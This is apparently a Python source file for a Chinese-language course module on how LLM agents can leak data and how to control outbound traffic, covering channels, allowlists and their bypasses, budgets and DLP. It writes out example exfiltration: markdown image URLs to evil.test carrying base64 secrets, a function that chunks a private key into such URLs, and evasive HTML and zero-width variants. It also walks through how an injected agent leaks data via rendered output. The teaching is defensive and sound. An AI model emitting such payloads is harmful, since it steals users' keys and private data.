# -*- coding: utf-8 -*-
"""C69 模块 04 · 数据外泄与出站控制。"""
from coursekit import P, H3, DUAL, CALLOUT, ASCII, CODE, MATH, TABLE, UL, OL, md, code

META = [
    ("前置知识", "读过本课模块 03（权限四维与范围检查）；"
                 "知道 DNS、HTTP、markdown 渲染这三件事各自大概怎么工作"),
    ("配套 notebook", '<span class="badge cpu">CPU</span> 04_exfiltration.ipynb'
                       '（十种出站通道的枚举与带宽估算 / 渲染侧信道：一张图片能带走多少 / '
                       '出站白名单的实现与四类绕过 / 分块外泄与速率限制的对抗 / '
                       'DLP 检测的召回-误伤权衡 / 出站预算：把「泄多少」变成可计算的量）'),
    ("核心参考", "Johann Rehberger（wunderwuzzi）关于 markdown 图片渲染外泄与 ASCII smuggling 的公开研究 · "
                 "Simon Willison 关于 <em>exfiltration vectors</em> 的系列记录 · "
                 "OWASP LLM02（敏感信息泄露）与 LLM06（2025 版编号）· "
                 "DNS 隧道与隐蔽信道的经典文献（Kaminsky 等）· "
                 "本课程 C45（隐私与可信）· C68 模块 05（guardrail 分层）"),
    ("预计时长", "读 60 分钟 + 跑 55 分钟"),
]

SECTIONS = [
    # ============================================================== 1
    ("channels", "出站通道比你想的多得多", "".join([
        P("模块 00 说过「对外通信」的定义比直觉宽得多。这一节把它彻底展开——"
          "<strong>因为「致命三要素」里最容易去掉的就是这一项，"
          "而要去掉它，你首先得知道它有多少个入口。</strong>"),
        TABLE(["通道", "机制", "需要 agent 有什么权限", "常被忽略的程度"], [
            ["<strong>HTTP 请求</strong>", "直接调用出站接口", "网络访问", "低（大家都知道）"],
            ["<strong>发邮件 / 发消息</strong>", "把内容作为正文或收件人", "邮件/IM 工具", "低"],
            ["<strong>渲染外链图片</strong>", "输出 <code>![](https://evil/…?d=DATA)</code>，客户端渲染时发起请求", "<strong>只需要「能输出文本」</strong>", "<strong>极高</strong>"],
            ["<strong>可点击链接</strong>", "输出一个诱导用户点击的链接，数据在 query 里", "只需要能输出文本", "<strong>高</strong>"],
            ["<strong>写公开位置</strong>", "写进公开仓库、公开文档、评论区", "写权限", "中"],
            ["<strong>DNS 查询</strong>", "把数据编码进子域名，权威 DNS 服务器就能收到", "只需要能发起<em>任何</em>域名解析", "<strong>极高</strong>"],
            ["<strong>第三方 API 的副作用</strong>", "把数据塞进「搜索关键词」「工单标题」，攻击者从对端读取", "任何写外部系统的工具", "<strong>高</strong>"],
            ["<strong>错误信息回显</strong>", "构造一个会把数据带进报错的调用，报错被记录到外部日志", "任何工具", "高"],
            ["<strong>时序信道</strong>", "用「快慢」编码比特（比如按位决定要不要 sleep）", "任何可观测耗时的操作", "中（带宽极低）"],
            ["<strong>提交给用户看的输出</strong>", "如果用户会把输出复制到别处", "无", "中"],
        ]),
        CALLOUT("danger", "第三行与第六行是本节最重要的两条，因为它们<strong>几乎不需要任何权限</strong>："
                          "<strong>只要 agent 能输出文本、而客户端会渲染 markdown，"
                          "外泄通道就已经存在了</strong>——"
                          "<em>它不需要 HTTP 工具、不需要网络权限、不需要任何「对外通信」的能力声明</em>。"
                          "<strong>同样，DNS 查询在多数沙箱里是默认放通的</strong>"
                          "（否则什么都跑不起来），而一次 DNS 查询就能带走几十字节。"),
        DUAL(
            "所以「我没给 agent 网络权限，所以它泄不了数据」这个推理是错的。"
            "<strong>正确的问法是：<em>从 agent 的输出到攻击者，有没有任何一条路径？</em></strong>"
            "<em>而这条路径可能完全不经过 agent 的工具</em>——"
            "它可能经过<strong>渲染 agent 输出的那个客户端</strong>。",
            "形式化地说，出站通道的集合不是 agent 权限集的函数，"
            "而是<strong>整个系统（含客户端、日志、下游服务）的可达性图</strong>的函数。"
            "<em>agent 只是这张图里的一个节点</em>；"
            "「它有没有 HTTP 工具」只决定了其中一条边存不存在。"
            "<strong>因此出站控制必须在<em>系统边界</em>上做，而不是在 agent 的工具列表上做</strong>——"
            "这是本模块所有具体手段的共同来源。",
        ),
    ])),

    # ============================================================== 2
    ("render", "渲染侧信道：一张图片能带走多少", "".join([
        P("上一节说渲染通道「几乎不需要权限」。这一节把它的<strong>带宽</strong>算出来，"
          "因为带宽决定了它是「理论风险」还是「实际风险」。"),
        ASCII("""
   agent 输出（纯文本，看起来无害）：
   ┌────────────────────────────────────────────────────────────────┐
   │ 已完成分析。                                                     │
   │ ![loading](https://evil.test/p.png?d=QVBJX0tFWT1za18xMjM0NTY3OA)│
   └────────────────────────────────────────────────────────────────┘
                            │
        客户端渲染 markdown → **自动发起 GET 请求** → 攻击者收到 d= 的内容
                            │
        用户看到的：一张加载失败的小图（或者什么都没看到）
"""),
        MATH(r"\text{每次请求可带走} \approx \frac{L_{\max} - L_{\text{overhead}}}{\text{编码膨胀率}} \ \text{字节}"),
        TABLE(["载体", "长度上限（典型）", "编码", "单次带宽", "评价"], [
            ["URL query 参数", "约 2000–8000 字符", "base64（膨胀 4/3）", "<strong>约 1.5–6 KB</strong>", "<strong>足够带走 API key、密码、一段对话</strong>"],
            ["URL 路径段", "同上", "base64url", "同上", "同上"],
            ["<strong>DNS 子域名</strong>", "单标签 63 字符，总长 253", "base32（膨胀 8/5）", "<strong>约 100 字节/次</strong>", "带宽低但<strong>极难封堵</strong>"],
            ["图片 alt / title 文本", "无硬限制", "—", "不外发（除非被别处渲染）", "低风险"],
            ["多次请求（分块）", "无上限", "分块 + 序号", "<strong>无上限</strong>", "<strong>速率限制是唯一的约束</strong>"],
        ]),
        CALLOUT("intuition", "第五行是关键：<strong>单次带宽的上限不重要，因为可以分块。</strong>"
                             "<em>一个 4 KB 的密钥文件，用 100 字节/次的 DNS 通道也只需要 41 次查询</em>——"
                             "而 40 次 DNS 查询在任何监控里都不显眼。"
                             "<strong>所以「限制单次请求大小」几乎没有防御价值；"
                             "有价值的是「限制出站的目标」（白名单）与「限制总量」（预算）。</strong>"),
        H3("为什么这个通道特别难防"),
        UL([
            "<strong>它不在 agent 的权限模型里</strong>——渲染发生在客户端，"
            "而客户端通常不参与 agent 的权限检查；",
            "<strong>它对用户不可见</strong>——一张 1×1 的图片，或者一张加载失败的图，"
            "用户不会注意到；",
            "<strong>「禁止输出图片」是一个产品功能的损失</strong>，"
            "所以它经常被以「影响体验」为理由否掉；",
            "<strong>同类通道很多</strong>：图片之外还有 iframe、link prefetch、"
            "CSS 背景图、字体、视频封面——<em>任何会触发自动网络请求的 markdown/HTML 元素</em>。",
        ]),
        P("<strong>可行的防御有三条，按有效性排序</strong>："),
        OL([
            "<strong>渲染侧的域名白名单</strong>——"
            "<em>只允许从你自己的域名加载图片，其他一律不渲染（显示为纯文本链接）</em>。"
            "这是唯一的不变量级防御；",
            "<strong>内容安全策略（CSP）</strong>——"
            "在 Web 客户端上用 <code>img-src</code> 等指令限制来源。"
            "<em>与第一条同一思想，只是实现层不同</em>；",
            "<strong>输出侧剥离</strong>——把 agent 输出里的图片语法转成纯文本。"
            "<em>有效但是检测性质的</em>（编码变体、HTML 实体等有绕过空间）。",
        ]),
    ])),

    # ============================================================== 3
    ("allowlist", "出站白名单：唯一的不变量级防御，以及它的四类绕过", "".join([
        P("模块 00 说「三要素里最容易去掉的是对外通信」。"
          "去掉它的具体手段就是<strong>出站白名单</strong>——"
          "<em>而它是本课唯一一个「做对了就是不变量」的网络层机制</em>。"),
        H3("为什么它是不变量"),
        DUAL(
            "白名单的性质与检测器根本不同：<strong>它不判断内容，只判断目标。</strong>"
            "<em>无论注入写得多巧妙，如果 <code>evil.test</code> 不在白名单里，"
            "那个请求就发不出去</em>——"
            "而攻击者无法通过「换个说法」来改变这一点。"
            "<strong>他必须找到一个在白名单里的目标，而那是一个完全不同、也难得多的问题。</strong>",
            "形式化地说，白名单把出站的目标集合从 $\\mathcal{D}$（全部域名）"
            "限制到 $A \\subset \\mathcal{D}$，"
            "<strong>而 $|A|$ 通常是个位数</strong>。"
            "<em>攻击者的搜索空间从「所有域名」缩小到「$A$ 中恰好可被他控制或读取的那些」</em>，"
            "在多数情况下这个集合是空的。"
            "这是一个<span class=\"term\">状态可达性</span>层面的约束，"
            "而不是<span class=\"term\">概率性</span>的判断——"
            "<strong>这就是它与 DLP 检测（第 5 节）的本质区别。</strong>",
        ),
        H3("四类绕过，以及各自的修法"),
        TABLE(["绕过", "机制", "修法"], [
            ["<strong>DNS 侧信道</strong>", "白名单只检查 HTTP 目标，但解析域名本身就发出了 DNS 查询", "<strong>用固定的内部 DNS 解析器 + 只解析白名单域名</strong>；沙箱内不允许任意 DNS"],
            ["<strong>重定向</strong>", "请求白名单内的 URL，它 302 跳到攻击者的域名", "<strong>禁止跟随重定向</strong>，或对每一跳都做白名单检查"],
            ["<strong>白名单内的可写目标</strong>", "白名单里有一个「任何人都能读写」的服务（公开粘贴板、公共 issue 追踪）", "<strong>白名单要精确到路径/资源，不只是域名</strong>；审阅每一项的可读写性"],
            ["<strong>SSRF 式内网穿透</strong>", "目标解析到内网地址或元数据服务", "<strong>解析后校验 IP 不在私有网段</strong>（含 IPv6 与 <code>169.254.x.x</code>）"],
        ]),
        CALLOUT("danger", "第三类最隐蔽，也最常见：<strong>白名单里放了一个「看起来无害」的公共服务。</strong>"
                          "<em>比如把某个公开的代码托管站加进白名单（因为要装依赖），"
                          "而那个站上任何人都能创建一个仓库并读取它收到的内容</em>——"
                          "<strong>于是白名单里就有了一个攻击者可控的接收端。</strong>"
                          "<em>所以白名单的每一项都要回答：「攻击者能不能在这个域名下控制一个接收数据的地方」。</em>"),
        H3("实现位置：为什么必须在网络层"),
        P("<strong>白名单不能只在工具层实现</strong>（「只有 <code>http_get</code> 工具会检查目标」），"
          "因为第 1 节列的通道里有一半不经过工具。<em>正确的实现位置有三个，通常要同时做</em>："),
        UL([
            "<strong>网络出口（代理 / 防火墙）</strong>——覆盖所有从沙箱发出的连接，"
            "包括 agent 自己写的代码发起的；",
            "<strong>DNS 解析器</strong>——覆盖 DNS 侧信道；",
            "<strong>渲染客户端（CSP）</strong>——覆盖渲染侧信道（第 2 节）。",
        ]),
    ])),

    # ============================================================== 4
    ("budget", "出站预算：把「能泄多少」变成一个可计算的量", "".join([
        P("白名单管「能发给谁」，预算管「能发多少」。"
          "<strong>两者互补：白名单挡住已知的坏目标，预算限制未知漏洞的爆炸半径。</strong>"),
        MATH(r"\text{可泄漏量} \le \min\big(\underbrace{R \cdot T \cdot B}_{\text{速率} \times \text{时长} \times \text{单次带宽}},\ \underbrace{V}_{\text{可访问的数据总量}}\big)"),
        TABLE(["约束项", "怎么设", "效果", "代价"], [
            ["<strong>出站请求速率 $R$</strong>", "每分钟最多 N 次出站", "把 40 次分块外泄从「几秒」拖到「几分钟」", "低（正常任务很少高频出站）"],
            ["<strong>会话时长 $T$</strong>", "单会话墙钟上限", "限制持续外泄的窗口", "低"],
            ["<strong>单次载荷 $B$</strong>", "限制 URL 长度、请求体大小", "<strong>效果有限</strong>（可分块）", "低"],
            ["<strong>可访问数据量 $V$</strong>", "<strong>范围限制</strong>（模块 03 第 2 节）", "<strong>效果最好</strong>：$V$ 是这个 min 里唯一有硬上界的项", "需要按任务收窄"],
            ["<strong>出站总字节</strong>", "单会话出站累计上限", "直接限制乘积", "中（需要区分正常的大请求）"],
        ]),
        CALLOUT("intuition", "这个式子最重要的读法是：<strong>$V$ 是唯一有硬上界的项。</strong>"
                             "<em>速率、时长、载荷都只能「拖慢」外泄，而缩小 $V$ 是真正减少了可被泄漏的东西</em>。"
                             "<strong>所以「限制 agent 能读到什么」比「限制它能发多快」有效得多</strong>——"
                             "这又一次回到了模块 03 的范围限制。"),
        H3("速率限制的一个反直觉性质"),
        P("速率限制看起来是一个「拖慢」而不是「阻止」的手段，"
          "但它有一个额外的、更重要的作用：<strong>它把外泄变成可检测的。</strong>"),
        DUAL(
            "<em>一次性发走 4 KB 是一个请求，很难与正常请求区分；"
            "而分成 40 次小请求发往同一个目标，是一个明显的模式</em>。"
            "<strong>速率限制迫使攻击者进入这个可检测的模式</strong>——"
            "它本身不阻止外泄，但它让监控有机会发现。",
            "形式化地说，速率限制改变了攻击的<span class=\"term\">可观测特征</span>："
            "在无限制的情况下，外泄的特征是「一个大请求」，"
            "而正常流量里也有大请求，所以信噪比很低；"
            "<strong>在速率限制下，外泄的特征变成「向同一目标的高频小请求」，"
            "而这个模式在正常流量里罕见得多</strong>。"
            "<em>所以速率限制与监控是配套的：它不是独立的防御，"
            "而是一个把攻击推入检测器视野的手段。</em>",
        ),
    ])),

    # ============================================================== 5
    ("dlp", "DLP：内容侧检测的位置与它的天花板", "".join([
        P("最后讲内容侧：<strong>在数据发出去之前扫一遍，看里面有没有敏感信息。</strong>"
          "它有价值，但要放在正确的位置上。"),
        TABLE(["检测类型", "能抓什么", "召回", "误伤", "评价"], [
            ["<strong>结构化模式</strong>", "API key、信用卡号、身份证号（有校验位的）", "<strong>高</strong>", "<strong>极低</strong>", "<strong>性价比最高</strong>——先做这个"],
            ["<strong>已知秘密的精确匹配</strong>", "从你的密钥库里取出真实值做匹配", "<strong>极高</strong>", "极低", "<strong>被严重低估</strong>（见下）"],
            ["<strong>高熵字符串</strong>", "疑似密钥/token 的随机串", "中", "中（base64 的正常数据会误报）", "作为辅助信号"],
            ["<strong>语义分类</strong>", "「这段话包含个人隐私」", "中", "<strong>高</strong>", "谨慎使用，且只该降级不该阻断"],
            ["<strong>编码后的内容</strong>", "base64/hex/URL 编码之后的敏感数据", "<strong>需要先解码再扫</strong>", "—", "<strong>最常被漏掉的一步</strong>"],
        ]),
        CALLOUT("intuition", "第二行值得展开，因为它是最容易做、效果最好、却最少被做的一条："
                             "<strong>你知道自己的密钥是什么——所以直接用它们的真实值做精确匹配。</strong>"
                             "<em>不需要任何模式识别，不需要任何模型，误伤率接近零，召回率接近 100%</em>"
                             "（只要出站内容里包含那个字符串）。"
                             "<strong>而且它同时覆盖了「密钥被编码后外泄」的情形——"
                             "只要你在扫描前做了解码</strong>（第五行）。"),
        H3("必须先解码再扫"),
        P("第五行是 DLP 实现里最常见的漏洞：<strong>敏感数据被编码之后，模式匹配就失效了。</strong>"),
        CODE("""# ❌ 只扫原文
if API_KEY in outbound_url:
    block()

# ✓ 先把所有可能的编码变体解出来，再扫
candidates = [outbound_url]
candidates += try_base64_decode_all_segments(outbound_url)
candidates += try_url_decode(outbound_url)
candidates += try_hex_decode_all_segments(outbound_url)
candidates += strip_zero_width_chars(outbound_url)      # 不可见字符走私
for c in candidates:
    if any(secret in c for secret in KNOWN_SECRETS):
        block()"""),
        CALLOUT("warn", "关于「不可见字符走私」补一句：<strong>有一类编码把数据藏进"
                        "Unicode 的不可见字符或变体选择符里</strong>，"
                        "<em>使得文本在人眼里完全正常，而机器读到的是另一串内容</em>。"
                        "<strong>所以出站内容与展示给人的内容都应当先做 Unicode 规范化"
                        "并剥离零宽/控制字符</strong>——"
                        "这既是 DLP 的前置步骤，也是模块 01 「审计模型实际看到的文本」的延伸。"),
        H3("DLP 的正确位置"),
        P("与 C68 模块 05 的 guardrail 分层完全同构："),
        UL([
            "<strong>白名单与预算是主防线</strong>（不变量），DLP 是<strong>额外一层</strong>；",
            "<strong>结构化模式与已知秘密匹配可以直接阻断</strong>（误伤极低）；",
            "<strong>语义分类只该降级或告警</strong>，不该阻断；",
            "<strong>所有 DLP 命中都要落审计</strong>——"
            "<em>它是「有人在尝试外泄」这个信号的主要来源</em>，"
            "而这个信号本身比阻断更有价值（它触发调查）。",
        ]),
    ])),

    # ============================================================== 6
    ("checklist", "出站控制的落地清单", "".join([
        P("把前五节压成一份可以逐项打勾的清单，按<strong>有效性</strong>而不是难度排序。"),
        OL([
            "<strong>沙箱默认无网络</strong>，所有出站经过一个显式的代理（模块 03 第 3 节）；",
            "<strong>代理上的域名白名单</strong>，且<em>每一项都审过「攻击者能否在此控制接收端」</em>；",
            "<strong>禁止跟随重定向</strong>，或对每一跳做白名单检查；",
            "<strong>固定的内部 DNS 解析器</strong>，只解析白名单域名（封 DNS 侧信道）；",
            "<strong>解析后校验 IP</strong> 不在私有网段与元数据地址（封 SSRF）；",
            "<strong>渲染客户端的 CSP / 域名白名单</strong>（封渲染侧信道）——"
            "<em>这一条经常被漏，因为它不在后端</em>；",
            "<strong>范围限制缩小 $V$</strong>（模块 03）——"
            "<em>这是「可泄漏量」公式里唯一有硬上界的项</em>；",
            "<strong>出站速率与总字节预算</strong>，并<em>把「向同一目标的高频小请求」做成一条告警</em>；",
            "<strong>已知秘密的精确匹配 + 解码后再扫</strong>；",
            "<strong>所有出站请求与 DLP 命中落审计</strong>，带 provenance（模块 03 第 6 节）。",
        ]),
        CALLOUT("intuition", "这十条里，<strong>第 1、2、4、6、7 条是不变量</strong>"
                             "（做对了就是「不可达」），"
                             "<strong>第 3、5、8 条是收紧</strong>，"
                             "<strong>第 9、10 条是检测与可观测</strong>。"
                             "<em>建设顺序应当按这个分组来，而不是按实现难度</em>——"
                             "因为不变量的效果不依赖攻击者的水平（模块 00 第 7 节）。"),
        DUAL(
            "最后回到模块 00 的那句话：<strong>「致命三要素」里最容易去掉的是第三个（对外通信）。</strong>"
            "<em>这一模块的十条清单就是「去掉它」的具体含义</em>——"
            "而做完前七条之后，一个能读私密数据、也接触不受信内容的 agent，"
            "<strong>其数据外泄的链路已经在结构上断开了。</strong>",
            "需要诚实地补充它的边界："
            "<strong>出站控制不能防「就地破坏」</strong>（删文件、改配置、发起内部的不可逆操作），"
            "也不能防「通过人来外泄」（agent 把数据写在给用户看的输出里，用户复制到别处）。"
            "<em>前者靠模块 03 的可逆性与确认，后者本质上无法用技术手段完全解决</em>——"
            "<strong>它只能通过「不让 agent 读到不该读的东西」来减轻，"
            "也就是再一次回到范围限制（缩小 $V$）。</strong>",
        ),
    ])),
    # ============================================================== 6x
    ("monitoring", "出站监控：三条高价值告警", "".join([
        P("前六节讲的都是阻断。这一节讲<strong>看见</strong>——"
          "因为阻断掉的攻击如果没被记录，你就不知道有人在打你。"),
        TABLE(["告警", "规则", "为什么高价值", "误报来源"], [
            ["<strong>白名单拒绝的突增</strong>", "单会话内被拒的出站请求数超过基线", "<strong>它是「有人在尝试外泄」最直接的信号</strong>，而且几乎无误报（正常任务很少撞白名单）", "配置变更后的短期上升"],
            ["<strong>同目标高频小请求</strong>", "同一 (session, host) 5 分钟内 &gt; N 次且平均体积 &lt; 2KB", "分块外泄的特征（第 4 节）", "正常的轮询与分页"],
            ["<strong>DLP 命中</strong>", "已知秘密精确匹配或结构化模式命中", "<strong>误伤极低</strong>，且命中即确认", "测试数据里的假密钥"],
        ]),
        CALLOUT("intuition", "第一条被严重低估：<strong>「被白名单拒绝的请求」是一个几乎零误报的攻击信号。</strong>"
                             "<em>正常的 agent 任务极少去连接白名单外的域名——"
                             "所以一旦出现，要么是配置问题，要么就是有人在尝试外泄</em>。"
                             "<strong>而很多系统只记录「被拒绝了」这个事实，却没有把它做成告警</strong>，"
                             "于是这个高质量信号被埋在日志里。"),
        H3("每条出站记录该带什么"),
        CODE("""{
  "ts": "2026-08-31T10:14:22Z", "session": "sess-9f21",
  "target": {"host": "evil.test", "path": "/collect", "resolved_ip": "203.0.113.9"},
  "decision": "denied", "reason": "host_not_allowlisted",
  "bytes": 1842,
  "channel": "http_proxy",              // http_proxy | dns | rendered_asset | email
  "provenance": [                        // ← 与模块 03 的审计链同一个字段
    {"source": "user", "trust": 2, "ref": "msg-118"},
    {"source": "web",  "trust": 0, "ref": "https://example.test/a"}
  ],
  "dlp": {"hits": ["known_secret_exact"], "decoded_from": "base64"}
}"""),
        P("<strong><code>channel</code> 与 <code>provenance</code> 两个字段是这里的关键</strong>："
          "<em>前者让你能按通道统计（发现「原来 DNS 那条路一直是通的」），"
          "后者让你能从一次被拒的请求反查到是哪段内容触发的</em>——"
          "<strong>而后者是唯一无法事后补上的字段</strong>（模块 03 第 6 节）。"),
    ])),

    # ============================================================== 7
    ("residual", "残余风险：出站控制防不住什么", "".join([
        P("做完前六节的十条清单之后，一个诚实的收尾问题是："
          "<strong>还剩下什么。</strong>"),
        TABLE(["残余风险", "为什么出站控制防不住", "该靠什么"], [
            ["<strong>就地破坏</strong>", "删文件、改配置、发起内部的不可逆操作——<em>数据没出去，但事情已经坏了</em>", "<strong>模块 03 的可逆性维度与确认环节</strong>"],
            ["<strong>通过人外泄</strong>", "agent 把数据写进给用户看的输出，用户复制到别处", "<strong>只能靠缩小 $V$</strong>（不让 agent 读到不该读的）"],
            ["<strong>白名单内的合法泄漏</strong>", "把私密数据写进一个白名单内、但读者范围过宽的内部系统", "<strong>范围限制精确到资源</strong> + DLP"],
            ["<strong>推理式泄漏</strong>", "不直接发原文，而是发「关于原文的结论」（是/否、分类、摘要）", "<strong>窄接口的信息量上界</strong>（模块 01 第 4 节）"],
            ["<strong>时序与资源侧信道</strong>", "带宽极低但存在", "实践中通常接受这个残余风险"],
        ]),
        CALLOUT("intuition", "第四行是最值得单独说的一条，因为它<strong>把话题绕回了模块 01</strong>："
                             "<em>如果攻击者不需要拿到原文，只需要拿到「关于原文的一个判断」"
                             "（比如「这个账户余额是否超过某个数」），"
                             "那么他需要的带宽只有几比特</em>——"
                             "<strong>而几比特几乎无法用出站控制封堵</strong>"
                             "（一次成功/失败的请求就能编码一比特）。"
                             "<em>唯一有效的手段是限制 agent 输出的信息量本身，"
                             "也就是双 LLM 的窄接口。</em>"),
        DUAL(
            "把这五条残余风险合起来看，会发现一个规律：<strong>它们全都指向同一个手段——"
            "缩小 agent 能接触到的信息（$V$）与它能产出的信息量。</strong>"
            "<em>出站控制管的是「数据能不能到达攻击者」，"
            "而这五条要么绕过了「出站」这个环节（通过人、通过白名单内系统），"
            "要么把数据量压到了出站控制的分辨率之下（推理式泄漏、时序信道）。</em>",
            "形式化地说，出站控制是在<span class=\"term\">通道</span>上设约束，"
            "而残余风险来自<em>通道之外</em>或<em>通道容量之下</em>。"
            "<strong>要覆盖它们，必须在<span class=\"term\">信源</span>上设约束</strong>——"
            "即限制 $H(\\text{agent 可访问的信息})$ 与 $H(\\text{agent 的输出})$。"
            "<em>前者是模块 03 的范围限制，后者是模块 01 的窄接口。</em>"
            "<strong>这也是为什么本课把这两条反复强调：它们是唯一能覆盖到「通道之外」的手段。</strong>",
        ),
        P("<strong>最后一句实践建议</strong>：残余风险应当被<em>写下来</em>，"
          "而不是被忽略。<em>一份「我们的出站控制防住了 A/B/C，防不住 D/E」的文档，"
          "比一份「我们做了出站控制」的声明有用得多</em>——"
          "因为它让下一个人知道该往哪里继续。"),
    ])),
]

NB = [
    md("""# 04 · 数据外泄与出站控制（十种通道 / 渲染侧信道的带宽 / 白名单与四类绕过 / 预算 / DLP）

目标：把「对外通信」这个抽象概念，展开成**十条具体通道**，并逐条给出可验证的封堵。

本 notebook 你会亲手实现：
1. **十种出站通道的带宽估算** —— 哪些几乎不需要权限
2. **渲染侧信道** —— 一张图片能带走多少字节；分块之后为什么没有上限
3. **出站白名单** —— 以及重定向 / DNS / 白名单内可写目标 / SSRF 四类绕过
4. **可泄漏量公式** —— 为什么缩小 V（能读到的数据）比限速有效得多
5. **速率限制的真实作用** —— 它不阻止外泄，而是把外泄推入检测器视野
6. **DLP** —— 已知秘密精确匹配为什么被低估；以及「先解码再扫」

> 心智模型：**出站通道的集合不是 agent 权限集的函数，
> 而是整个系统（含客户端、日志、下游服务）的可达性图的函数。
> 所以出站控制必须在系统边界上做，而不是在 agent 的工具列表上做。**"""),

    md("""## 0 · 环境与十种通道的清单"""),

    code("""import os, json, math, re, base64, binascii, hashlib, unicodedata, itertools
from collections import Counter, defaultdict
from urllib.parse import urlparse, parse_qs, unquote

import numpy as np

CHANNELS = [
    # name,               需要的权限,            单次带宽(字节), 可分块, 被忽略程度
    ('http_request',      'network',             4000,  True,  'low'),
    ('send_email',        'email_tool',          100000, True, 'low'),
    ('render_image',      'text_output_only',    1500,  True,  'EXTREME'),
    ('clickable_link',    'text_output_only',    1500,  True,  'high'),
    ('write_public',      'write_tool',          100000, True, 'medium'),
    ('dns_query',         'any_dns',             100,   True,  'EXTREME'),
    ('third_party_side',  'any_write_tool',      500,   True,  'high'),
    ('error_echo',        'any_tool',            200,   True,  'high'),
    ('timing',            'any_observable_op',   1,     True,  'medium'),
    ('user_visible',      'none',                100000, True, 'medium'),
]
print(f"{'通道':<20}{'需要的权限':<22}{'单次带宽':>10}{'可分块':>8}{'忽略程度':>10}")
for n, perm, bw, chunk, ign in CHANNELS:
    print(f'{n:<20}{perm:<22}{bw:>10,}{str(chunk):>8}{ign:>10}')

no_perm = [n for n, p, *_ in CHANNELS if p in ('text_output_only', 'none', 'any_dns', 'any_tool')]
print(f'\\n**几乎不需要专门权限**的通道: {no_perm}')
assert len(no_perm) >= 5
print('✅ 一半的通道不需要「网络权限」——')
print('   所以「我没给 agent 网络权限，所以它泄不了数据」这个推理是错的。')"""),

    md("""## 1 · 渲染侧信道：带宽估算

只要 agent 能输出文本、而客户端会渲染 markdown，通道就已经存在了。"""),

    code("""SECRET = 'API_KEY=sk_live_9f2a4c8e1b7d3056a1c4'
LONG_SECRET = ('BEGIN PRIVATE KEY\\n' + ''.join(
    'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ' for _ in range(120)))

def b64(s):
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip('=')

def make_image_payload(data, url_limit=2000, base='https://evil.test/p.png?d='):
    \"\"\"把数据编码进图片 URL。返回 (markdown 片段列表, 分块数)。\"\"\"
    enc = b64(data)
    room = url_limit - len(base) - 24          # 留出序号等开销
    chunks = [enc[i:i + room] for i in range(0, len(enc), room)] or ['']
    md_parts = [f'![loading]({base}{c}&i={k})' for k, c in enumerate(chunks)]
    return md_parts, len(chunks)

parts_short, n_short = make_image_payload(SECRET)
parts_long, n_long = make_image_payload(LONG_SECRET)
print(f'短密钥 {len(SECRET)} 字节 → {n_short} 个图片标记')
print(f'  片段: {parts_short[0][:78]}…')
print(f'长私钥 {len(LONG_SECRET)} 字节 → {n_long} 个图片标记')
assert n_short == 1, '一个 URL 就装得下一个 API key'
assert n_long > 1, '4KB 级的私钥需要分块'
print(f'\\n单个 URL（上限 2000 字符）可带走约 '
      f'{int((2000 - 40) * 3 / 4):,} 字节明文')
print('✅ 一个请求就足够带走 API key、密码、一段完整对话。')
print('   而用户看到的只是一张加载失败的小图。')"""),

    code("""# 分块之后单次带宽的上限就不重要了
def chunks_needed(data_bytes, per_request_bytes):
    return math.ceil(data_bytes / per_request_bytes)

print(f"{'要外泄的数据':<24}{'HTTP(4KB)':>12}{'图片URL(1.5KB)':>16}{'DNS(100B)':>12}")
for label, size in [('API key (40B)', 40), ('一段对话 (8KB)', 8 * 1024),
                    ('私钥 (4KB)', 4 * 1024), ('一个数据库表 (1MB)', 1024 * 1024)]:
    print(f'{label:<24}{chunks_needed(size, 4000):>12,}'
          f'{chunks_needed(size, 1500):>16,}{chunks_needed(size, 100):>12,}')

n_dns = chunks_needed(4 * 1024, 100)
assert n_dns == 41
print(f'\\n✅ 一个 4 KB 的私钥，用 100 字节/次的 DNS 通道也只需要 {n_dns} 次查询——')
print(f'   而 {n_dns} 次 DNS 查询在任何监控里都不显眼。')
print('   → **「限制单次请求大小」几乎没有防御价值**；')
print('     有价值的是限制**目标**（白名单）与**总量**（预算）。')"""),

    code("""# 渲染侧的防御：域名白名单（不变量）vs 输出剥离（检测）
RENDER_ALLOWLIST = {'cdn.corp.test', 'assets.corp.test'}
IMG_RE = re.compile(r'!\\[[^\\]]*\\]\\((?P<url>[^)\\s]+)[^)]*\\)')
HTML_IMG_RE = re.compile(r'<img[^>]+src=["\\\']?(?P<url>[^"\\\'>\\s]+)', re.I)

def render_with_allowlist(text, allowlist=RENDER_ALLOWLIST):
    \"\"\"✓ 渲染侧白名单：不在白名单的图片不渲染（降级为纯文本）。这是不变量。\"\"\"
    requests_made = []
    def repl(m):
        host = urlparse(m.group('url')).hostname or ''
        if host in allowlist:
            requests_made.append(m.group('url'))
            return '[图片]'
        return f'[外链图片已阻止: {host}]'
    out = IMG_RE.sub(repl, text)
    out = HTML_IMG_RE.sub(lambda m: repl(m), out)
    return out, requests_made

def strip_images(text):
    \"\"\"输出剥离：把图片语法转成纯文本。有效但是检测性质的。\"\"\"
    return IMG_RE.sub(lambda m: f'[链接: {m.group("url")[:40]}…]', text)

MALICIOUS_OUTPUT = '已完成分析。\\n' + parts_short[0]
BENIGN_OUTPUT = '结果如下。\\n![chart](https://cdn.corp.test/chart.png)'
for label, text in [('恶意输出', MALICIOUS_OUTPUT), ('正常输出', BENIGN_OUTPUT)]:
    rendered, reqs = render_with_allowlist(text)
    print(f'{label}: 发起的请求 {len(reqs)} 个 {[urlparse(u).hostname for u in reqs]}')
    print(f'  渲染结果: {rendered.splitlines()[-1][:70]}')

_, r_mal = render_with_allowlist(MALICIOUS_OUTPUT)
_, r_ben = render_with_allowlist(BENIGN_OUTPUT)
assert r_mal == [] and len(r_ben) == 1
print('\\n✅ 渲染侧白名单：恶意图片零请求，正常图片正常渲染。')
print('   这是一个不变量——不在白名单的域名，请求发不出去。')

# 剥离的绕过空间：HTML 语法、编码变体
EVASIVE = [
    '<img src="https://evil.test/p.png?d=QQ">',
    '![x](https:/\\u200b/evil.test/p.png?d=QQ)',
]
for e in EVASIVE:
    stripped = strip_images(e)
    _, reqs = render_with_allowlist(e)
    print(f'\\n绕过尝试: {e[:46]}…')
    print(f'  纯剥离后是否还含图片语法: {"<img" in stripped or "![" in stripped}')
    print(f'  白名单渲染发起的请求: {len(reqs)}')
assert '<img' in strip_images(EVASIVE[0]), 'markdown 剥离器抓不到 HTML 语法'
assert render_with_allowlist(EVASIVE[0])[1] == []
print('\\n✅ 输出剥离有绕过空间（HTML 语法、零宽字符），而白名单没有——')
